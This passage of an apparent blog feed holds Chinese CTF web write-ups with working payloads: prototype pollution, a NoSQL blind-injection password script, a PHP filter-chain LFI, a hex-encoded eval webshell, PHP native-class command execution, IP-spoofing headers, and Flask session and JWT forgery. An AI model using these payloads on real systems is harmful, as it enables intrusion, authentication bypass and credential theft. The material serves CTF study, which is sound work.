class="line">print(payload_json)</span><br><span class="line"></span><br><span class="line"># 发送 POST 请求</span><br><span class="line">response = requests.post(url, data=payload_json, headers=&#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;)</span><br><span class="line"></span><br><span class="line"># 打印响应内容</span><br><span class="line">print(&quot;Status Code:&quot;, response.status_code)</span><br><span class="line">print(&quot;Response Content:&quot;, response.text)</span><br></pre></td></tr></table></figure><h2 id="BaseCTF-Lucky-Number"><a href="#BaseCTF-Lucky-Number" class="headerlink" title="BaseCTF_Lucky Number"></a>BaseCTF_Lucky Number</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">你不会以为这里真的有flag吧？</span><br><span class="line"></span><br><span class="line">想要flag的话先提交我的幸运数字5346</span><br><span class="line"></span><br><span class="line">但是我的主人觉得我泄露了太多信息，就把我的幸运数字给删除了</span><br><span class="line"></span><br><span class="line">但是听说在heaven中有一种create方法，配合__kwdefaults__可以创造出任何事物，你可以去/m4G1c里尝试着接触到这个方法</span><br><span class="line"></span><br><span class="line">下面是前人留下来的信息，希望对你有用</span><br><span class="line"></span><br><span class="line">from flask import Flask,request,render_template_string,render_template</span><br><span class="line">from jinja2 import Template</span><br><span class="line">import json</span><br><span class="line">import heaven</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">BLACKLIST_IN_index = [&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]</span><br><span class="line">def is_json(data):</span><br><span class="line">    try:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        return True</span><br><span class="line">    except ValueError:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/m4G1c&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def pollute():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        if request.is_json:</span><br><span class="line">            merge(json.loads(request.data), instance)</span><br><span class="line">            result = heaven.create()</span><br><span class="line">            message = result[&quot;message&quot;]</span><br><span class="line">            return &quot;这个魔术还行吧</span><br><span class="line">&quot; + message</span><br><span class="line">        else:</span><br><span class="line">            return &quot;我要json的魔术&quot;</span><br><span class="line">    return &quot;记得用POST方法把魔术交上来&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#heaven.py</span><br><span class="line"></span><br><span class="line">def create(kon=&quot;Kon&quot;, pure=&quot;Pure&quot;, *, confirm=False):</span><br><span class="line">    if confirm and &quot;lucky_number&quot; not in create.__kwdefaults__:</span><br><span class="line">        return &#123;&quot;message&quot;: &quot;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&quot;, &quot;lucky_number&quot;: &quot;nope&quot;&#125;</span><br><span class="line">    if confirm and &quot;lucky_number&quot; in create.__kwdefaults__:</span><br><span class="line">        return &#123;&quot;message&quot;: &quot;这是你的lucky_number，请拿好，去/check下检查一下吧&quot;, &quot;lucky_number&quot;: create.__kwdefaults__[&quot;lucky_number&quot;]&#125;</span><br><span class="line"></span><br><span class="line">    return &#123;&quot;message&quot;: &quot;你有什么想创造的吗？&quot;, &quot;lucky_number&quot;: &quot;nope&quot;&#125;</span><br></pre></td></tr></table></figure><p>也是一个原型链污染，具体污染什么可以直接通过源码看</p><p>可以看到在heaven.py里面有一个函数就是create里面有两个if需要绕过</p><p>1.第一就是confirm参数为true，其次lucky_number在create.<strong>kwdefaults</strong>(这个就是create函数关键字参数的默认值的字典)中，这里就是我们的幸运数字，题目直接给了</p><p>思路还是一样通过获取全局属性进行修改函数里面<strong>kwdefaults</strong>的值即可</p><p>2.将上述代码中间部分修改即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">            &quot;heaven&quot;:&#123;</span><br><span class="line">                &quot;create&quot;:&#123;</span><br><span class="line">                    &quot;__kwdefaults__&quot;:&#123;</span><br><span class="line">                        &quot;confirm&quot;:&quot;True&quot;,</span><br><span class="line">                        &quot;lucky_number&quot;:&quot;5346&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后查看&#x2F;check给出一个&#x2F;ssSstTti1最后通过ssti来得flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;圣钥之战1-0&quot;&gt;&lt;a href=&quot;#圣钥之战1-0&quot; class=&quot;headerlink&quot; title=&quot;圣钥之战1.0&quot;&gt;&lt;/a&gt;圣钥之战1.0&lt;/h2&gt;&lt;p&gt;访问read路由拿到源码&lt;/p&gt;
&lt;figure class=&quot;highlight plaintex</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>nosql布尔盲注</title>
    <link href="http://1768161086.github,io/2025/03/17/nosql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    <id>http://1768161086.github,io/2025/03/17/nosql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
    <published>2025-03-17T13:34:46.000Z</published>
    <updated>2025-03-17T13:38:55.704Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN2024-hz-ezjava"><a href="#CISCN2024-hz-ezjava" class="headerlink" title="CISCN2024_hz_ezjava"></a>CISCN2024_hz_ezjava</h2><p>1.登录是&#x2F;login接口发起一个POST请求。</p><p>2.从源码可以看出来，在第一次访问&#x2F;login接口时会初始化一个<code>username为admin，password为随机32位字符</code>的数据进入数据库，这块采用单例模式，确保数据仅初始化一次。</p><p>3.点击登录后，会拿我们传入的数据去数据库查询信息</p><ul><li>若查询不到，则返回<code>username or password incorrect</code></li><li>若查到信息后，提取出<code>password</code>字段与我们输入的进行比对<ul><li>若匹配失败返回<code>password incorrect</code></li><li>若匹配成功，則读取flag</li></ul></li></ul><p>4.该项目使用的是<code>mongodb</code>数据库，并且存在明显的拼接点</p><p>5.nosql注入，我们拿一个联合注入的poc试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;: &#x27;a&amp;password=&#x27; &#125;], $comment: &#x27;123456</span><br></pre></td></tr></table></figure><p>6.调试发现可以成功查询到信息，但由于和我们传入的password值不匹配所以返回信息<code>password incorrect</code></p><p>编写nosql布尔盲注的脚本跑出密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1:9999/login&quot;</span><br><span class="line">mylist = &quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span><br><span class="line">password = &quot;&quot;</span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for j in mylist:</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;&#x27;,&#x27;password&#x27;:&#123;&#x27;$regex&#x27;:&#x27;^&quot;+password+j+&quot;.*&#x27;&#125;,&#x27;username&#x27;:&#x27;admin&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        #&#x27;,&#x27;password&#x27;:&#123;&#x27;$regex&#x27;:&#x27;^x.*&#x27;&#125;,&#x27;username&#x27;:&#x27;admin</span><br><span class="line">        r = requests.post(url,data=data,proxies=proxies)</span><br><span class="line">        if r.text.find(&quot;username or password incorrect&quot;)==-1:</span><br><span class="line">            password+=j</span><br><span class="line">            print(password)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CISCN2024-hz-ezjava&quot;&gt;&lt;a href=&quot;#CISCN2024-hz-ezjava&quot; class=&quot;headerlink&quot; title=&quot;CISCN2024_hz_ezjava&quot;&gt;&lt;/a&gt;CISCN2024_hz_ezjava&lt;/h2&gt;&lt;p&gt;1.</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>php_filter_chain</title>
    <link href="http://1768161086.github,io/2025/03/16/php-filter-chain/"/>
    <id>http://1768161086.github,io/2025/03/16/php-filter-chain/</id>
    <published>2025-03-16T10:28:16.000Z</published>
    <updated>2025-03-16T10:32:15.727Z</updated>
    
    <content type="html"><![CDATA[<h2 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h2><p>1.先随便尝试包含下index.php</p><p>2.访问.&#x2F;what’s_this.php</p><p>一眼顶针，鉴定为php_filter_chain</p><p>直接打的话XYCTF后会有脏数据</p><p>3.构造XYCTF&lt;?php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python php_filter_chain_generator.py --chain &quot;XYCTF&lt;?php&quot;</span><br></pre></td></tr></table></figure><p>最终payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags</span><br></pre></td></tr></table></figure><p>类似于：XYCTF_ezLFI</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;连连看到底是连连什么看&quot;&gt;&lt;a href=&quot;#连连看到底是连连什么看&quot; class=&quot;headerlink&quot; title=&quot;连连看到底是连连什么看&quot;&gt;&lt;/a&gt;连连看到底是连连什么看&lt;/h2&gt;&lt;p&gt;1.先随便尝试包含下index.php&lt;/p&gt;
&lt;p&gt;2.访问.&amp;#</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Bash内建命令</title>
    <link href="http://1768161086.github,io/2025/03/15/Bash%E5%86%85%E5%BB%BA%E5%91%BD%E4%BB%A4/"/>
    <id>http://1768161086.github,io/2025/03/15/Bash%E5%86%85%E5%BB%BA%E5%91%BD%E4%BB%A4/</id>
    <published>2025-03-15T05:57:55.000Z</published>
    <updated>2025-03-15T06:07:03.555Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Bash-内建命令"><a href="#Bash-内建命令" class="headerlink" title="Bash 内建命令"></a>Bash 内建命令</h1><p>这些命令是由Bash自身提供，而不是独立的程序：</p><p>alias - 定义或显示别名。<br>cd - 改变当前目录。<br>echo - 输出参数到标准输出。<br>exit - 退出当前shell。<br>export - 设置或显示环境变量。<br>history - 显示命令历史记录。<br>pwd - 打印当前工作目录的路径。<br>read - 从标准输入读取一行数据。<br>set - 设置或取消设置shell选项和位置参数。<br>type - 显示一个命令的类型。<br>unset - 删除变量或函数的定义。</p><h2 id="XYCTF2024ezMake"><a href="#XYCTF2024ezMake" class="headerlink" title="XYCTF2024ezMake"></a>XYCTF2024ezMake</h2><p>1.echo可以执行</p><p>2.直接echo写马会有waf</p><p>3.hex2bin可以过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?=eval(hex2bin(&quot;6576616c28245f504f53545b22636d64225d293b&quot;))?&gt;&#x27; &gt; yjh.php</span><br></pre></td></tr></table></figure><p>或者直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $$(&lt; flag)</span><br></pre></td></tr></table></figure><h2 id="XYCTF2024ez-Make"><a href="#XYCTF2024ez-Make" class="headerlink" title="XYCTF2024ez?Make"></a>XYCTF2024ez?Make</h2><p>1.这题patch了一下上题的非预期，不能再echo写马了</p><p>但也把&#x2F;bin下的命令放了出来，不再有PATH的限制</p><p>2.既然可以pwd，那就试试能不能cd。</p><p>知道flag路径在&#x2F;flag，所以可以cd再进行读文件，读文件的方法ban了不少，经过测试more还能用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;more [d-h][k-m][9-z][e-h]</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Bash-内建命令&quot;&gt;&lt;a href=&quot;#Bash-内建命令&quot; class=&quot;headerlink&quot; title=&quot;Bash 内建命令&quot;&gt;&lt;/a&gt;Bash 内建命令&lt;/h1&gt;&lt;p&gt;这些命令是由Bash自身提供，而不是独立的程序：&lt;/p&gt;
&lt;p&gt;alias - 定义</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>php原生类</title>
    <link href="http://1768161086.github,io/2025/03/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <id>http://1768161086.github,io/2025/03/15/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</id>
    <published>2025-03-15T04:59:25.000Z</published>
    <updated>2025-03-16T02:48:01.181Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP原生类的利用"><a href="#PHP原生类的利用" class="headerlink" title="PHP原生类的利用"></a>PHP原生类的利用</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>在CTF题目中，好几次都遇到了利用 PHP 原生类进行XSS、反序列化、SSRF以及XXE的思路，一直想好好看一下 PHP 原生类在 CTF 中的利用，迫于生活xx拖了好久。今天终于有机会好好总结总结了。常遇到的几个 PHP 原生类有如下几个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Error</span><br><span class="line">Exception</span><br><span class="line">SoapClient</span><br><span class="line">DirectoryIterator</span><br><span class="line">FilesystemIterator</span><br><span class="line">SplFileObject</span><br><span class="line">SimpleXMLElement</span><br></pre></td></tr></table></figure><h2 id="2-Error-Exception类方法："><a href="#2-Error-Exception类方法：" class="headerlink" title="2.Error&#x2F;Exception类方法："></a>2.<strong>Error&#x2F;Exception类方法：</strong></h2><p>Error::__construct — 初始化 error 对象<br>Error::getMessage — 获取错误信息<br>Error::getPrevious — 返回先前的 Throwable<br>Error::getCode — 获取错误代码<br>Error::getFile — 获取错误发生时的文件<br>Error::getLine — 获取错误发生时的行号<br>Error::getTrace — 获取调用栈（stack trace）<br>Error::getTraceAsString — 获取字符串形式的调用栈（stack trace）<br>Error::__toString — error 的字符串表达<br>Error::__clone — 克隆 error</p><h2 id="3-XYCTFezClass"><a href="#3-XYCTFezClass" class="headerlink" title="3.XYCTFezClass"></a>3.XYCTFezClass</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$aa=$_GET[&#x27;aa&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">$bb=$_GET[&#x27;bb&#x27;];</span><br><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">((new $a($aa))-&gt;$c())((new $b($bb))-&gt;$c());</span><br></pre></td></tr></table></figure><p>现在通过Error我们可以构造任意字符串，这不为所欲为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=new Error(&quot;Z3r4y&quot;);</span><br><span class="line">echo $a-&gt;getMessage();</span><br><span class="line">//Z3r4y</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=Error&amp;aa=system&amp;b=Error&amp;bb=cat /f*&amp;c=getMessage</span><br></pre></td></tr></table></figure><h2 id="4-XYCTFserialize"><a href="#4-XYCTFserialize" class="headerlink" title="4.XYCTFserialize"></a>4.XYCTFserialize</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo new $_POST[&#x27;X&#x27;]($_POST[&#x27;Y&#x27;]);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X=SplFileObject&amp;Y=php://filter/read=convert.base64-encode/resource=./flag.php</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP原生类的利用&quot;&gt;&lt;a href=&quot;#PHP原生类的利用&quot; class=&quot;headerlink&quot; title=&quot;PHP原生类的利用&quot;&gt;&lt;/a&gt;PHP原生类的利用&lt;/h1&gt;&lt;h2 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerli</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>http伪造</title>
    <link href="http://1768161086.github,io/2025/03/15/http%E4%BC%AA%E9%80%A0/"/>
    <id>http://1768161086.github,io/2025/03/15/http%E4%BC%AA%E9%80%A0/</id>
    <published>2025-03-15T01:59:36.000Z</published>
    <updated>2025-03-15T05:44:12.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-emojiCTF2024-easy-web"><a href="#1-emojiCTF2024-easy-web" class="headerlink" title="1.emojiCTF2024 easy_web"></a>1.emojiCTF2024 easy_web</h1><p>1.提示一： User-Agent:Baiduspide</p><p>2.抓包，修改UA</p><p>3.页面显示：欢迎来自垃圾百度的臭虫子！但是你爬不到什么了，因为本网站现在仅允许来自CloudFlare CDN的流量</p><p>查到以下网址：</p><p><a href="https://developers.cloudflare.com/fundamentals/reference/http-request-headers/">Cloudflare HTTP headers · Cloudflare Fundamentals docs</a></p><p>cf-connecting-ip: （这里填什么都行，表示流量来自 cf 网络）</p><p>cf-ipcountry: T1（表示来自洋葱网络）</p><h2 id="2-伪造代理："><a href="#2-伪造代理：" class="headerlink" title="2.伪造代理："></a>2.伪造代理：</h2><p>via:127.0.0.1</p><h2 id="3-伪造IP："><a href="#3-伪造IP：" class="headerlink" title="3.伪造IP："></a>3.伪造IP：</h2><p>X-Forwarded-For:127.0.0.1</p><p>X-Forwarded:127.0.0.1</p><p>Forwarded-For:127.0.0.1</p><p>Forwarded:127.0.0.1</p><p>X-Forwarded-Host:127.0.0.1</p><p>X-remote-IP:127.0.0.1</p><p>X-remote-addr:127.0.0.1</p><p>True-Client-IP:127.0.0.1</p><p>X-Client-IP:127.0.0.1</p><p>Client-IP:127.0.0.1</p><p>X-Real-IP:127.0.0.1</p><p>Ali-CDN-Real-IP:127.0.0.1</p><p>Cdn-Src-Ip:127.0.0.1</p><p>Cdn-Real-Ip:127.0.0.1</p><p>CF-Connecting-IP:127.0.0.1</p><p>X-Cluster-Client-IP:127.0.0.1</p><p>WL-Proxy-Client-IP:127.0.0.1</p><p>Proxy-Client-IP:127.0.0.1</p><p>Fastly-Client-Ip:127.0.0.1</p><p>True-Client-Ip:127.0.0.1</p><p>Host: 127.0.0.1</p><h2 id="4-伪造日期"><a href="#4-伪造日期" class="headerlink" title="4.伪造日期"></a>4.伪造日期</h2><p>Date: Tue, 27 Aug 2024 12:41:59 GMT</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-emojiCTF2024-easy-web&quot;&gt;&lt;a href=&quot;#1-emojiCTF2024-easy-web&quot; class=&quot;headerlink&quot; title=&quot;1.emojiCTF2024 easy_web&quot;&gt;&lt;/a&gt;1.emojiCTF2024 ea</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>JWT</title>
    <link href="http://1768161086.github,io/2025/03/14/JWT/"/>
    <id>http://1768161086.github,io/2025/03/14/JWT/</id>
    <published>2025-03-14T12:55:40.000Z</published>
    <updated>2025-03-29T07:22:51.118Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ISCTF-小蓝鲨的故事"><a href="#ISCTF-小蓝鲨的故事" class="headerlink" title="ISCTF 小蓝鲨的故事"></a>ISCTF 小蓝鲨的故事</h2><p>1.访问 &#x2F;robots.txt 路由，根据提示知道这是 key</p><p>2.利用 key 解 session，发现用户名为 www-data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -c &quot;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Zzc91w.1Gfyu8HAcfSlU3nsh8AD6NVIJNs&quot; -s &quot;GEMYyQ0h&quot;</span><br></pre></td></tr></table></figure><p>文件地址（kali）：<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>3.尝试伪造 root 身份无果，发现主界面的提示，Read Hacker!!!，尝试访问 &#x2F;Hacker 路由</p><p>4.源码里看到 我是ISctf_Hacker！！！！！！！！！！！！，尝试伪造ISctf_Hacker 身份访问 &#x2F;flag 路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;username&#x27;:b&#x27;ISctf_Hacker&#x27;&#125;&quot; -s &quot;GEMYyQ0h&quot;</span><br></pre></td></tr></table></figure><p>5.替换伪造的 session，发包得到 flag</p><h2 id="polar-jwt"><a href="#polar-jwt" class="headerlink" title="polar_jwt"></a>polar_jwt</h2><p>1.注册账号登录</p><p>2.进入个人中心页面</p><p>3.复制jwt进行密码爆破：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/brendan-rius/c-jwt-cracker</span><br></pre></td></tr></table></figure><p>安装 gcc 编译环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc</span><br></pre></td></tr></table></figure><p>安装 make</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install make</span><br></pre></td></tr></table></figure><p>进入文件目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd c-jwt-cracker</span><br></pre></td></tr></table></figure><p>输入命令 make</p><p>如出现报错则安装该头文件即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXJxIn0._dlzVUAezfghrwdHi5l7vJodMJWDNGIImpvxofI4BF8</span><br></pre></td></tr></table></figure><p>爆破密码后去<a href="https://jwt.io/">在线网址</a>修改登录名为admin</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ISCTF-小蓝鲨的故事&quot;&gt;&lt;a href=&quot;#ISCTF-小蓝鲨的故事&quot; class=&quot;headerlink&quot; title=&quot;ISCTF 小蓝鲨的故事&quot;&gt;&lt;/a&gt;ISCTF 小蓝鲨的故事&lt;/h2&gt;&lt;p&gt;1.访问 &amp;#x2F;robots.txt 路由，根据提示知</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>JWT 的 None 攻击</title>
    <link href="http://1768161086.github,io/2025/03/13/JWT-%E7%9A%84-None-%E6%94%BB%E5%87%BB/"/>
    <id>http://1768161086.github,io/2025/03/13/JWT-%E7%9A%84-None-%E6%94%BB%E5%87%BB/</id>
    <published>2025-03-13T11:33:24.000Z</published>
    <updated>2025-03-19T08:56:40.851Z</updated>
    
